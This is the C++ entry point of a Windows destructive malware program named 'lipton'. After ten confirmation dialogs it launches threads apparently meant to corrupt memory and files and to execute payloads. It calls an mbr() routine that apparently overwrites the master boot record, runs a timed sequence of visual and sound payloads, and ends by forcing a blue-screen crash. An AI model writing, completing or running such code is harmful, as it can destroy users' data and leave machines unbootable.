#pragma once
#include "lipton.h"
int __stdcall WinMain(HINSTANCE a, HINSTANCE b, char* c, int d) {
	if (MessageBoxA(0, "this is fucking dangerous (warning 1/10)", "lipton", 4096 | 4 | 48) != IDYES || MessageBoxA(0, "this is fucking dangerous (warning 2/10)", "lipton", 4096 | 4 | 48) != IDYES ||
		MessageBoxA(0, "this is fucking dangerous (warning 3/10)", "lipton", 4096 | 4 | 48) != IDYES || MessageBoxA(0, "this is fucking dangerous (warning 4/10)", "lipton", 4096 | 4 | 48) != IDYES ||
		MessageBoxA(0, "this is fucking dangerous (warning 5/10)", "lipton", 4096 | 4 | 48) != IDYES || MessageBoxA(0, "this is fucking dangerous (warning 6/10)", "lipton", 4096 | 4 | 48) != IDYES ||
		MessageBoxA(0, "this is fucking dangerous (warning 7/10)", "lipton", 4096 | 4 | 48) != IDYES || MessageBoxA(0, "this is fucking dangerous (warning 8/10)", "lipton", 4096 | 4 | 48) != IDYES ||
		MessageBoxA(0, "this is fucking dangerous (warning 9/10)", "lipton", 4096 | 4 | 48) != IDYES || MessageBoxA(0, "this is fucking dangerous (warning 10/10: last chance)", "lipton", 4096 | 4 | 48) != IDYES) ExitProcess(0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memoryfuck, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)corrupt, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);
	mbr();
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload1, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sound1, 0, 0, 0); Sleep(15000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload2, 0, 0, 0);Sleep(30000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload3, 0, 0, 0);Sleep(15000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload4, 0, 0, 0);Sleep(20000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload5, 0, 0, 0);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sound2, 0, 0, 0); Sleep(16000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload6, 0, 0, 0);Sleep(15000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload7, 0, 0, 0);Sleep(25000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload8, 0, 0, 0);Sleep(18000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload9, 0, 0, 0);Sleep(25000);
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload10, 0, 0, 0);Sleep(20000);
	bsod();
	Sleep(-1);
}